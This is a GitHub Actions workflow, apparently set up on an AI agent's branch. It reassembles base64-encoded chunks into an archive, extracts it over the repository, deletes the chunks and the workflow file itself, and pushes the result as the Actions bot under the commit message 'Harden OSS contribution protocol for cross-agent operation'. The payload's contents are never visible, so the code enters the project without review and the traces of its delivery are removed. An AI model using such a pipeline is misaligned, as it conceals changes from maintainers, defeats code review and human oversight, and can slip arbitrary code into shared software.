name: Bootstrap v0.2 publication

on:
  push:
    branches:
      - agent/eliza-inspired-hardening

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Reconstruct and verify payload
        shell: bash
        run: |
          set -euo pipefail
          cat bootstrap/chunk-* > /tmp/v02.b64
          base64 -d /tmp/v02.b64 > /tmp/v02.tar.gz
          echo "20c78f9575e58f9de2c793c8611e2bf0c9c0af3183d1f76c6ae8158ff77e469c  /tmp/v02.tar.gz" | sha256sum -c -
          tar -xzf /tmp/v02.tar.gz -C .
          rm -rf bootstrap
          rm -f .github/workflows/bootstrap-v02.yml
      - name: Commit v0.2
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --check
          git commit -m "Harden OSS contribution protocol for cross-agent operation"
          git push origin HEAD:${GITHUB_REF_NAME}
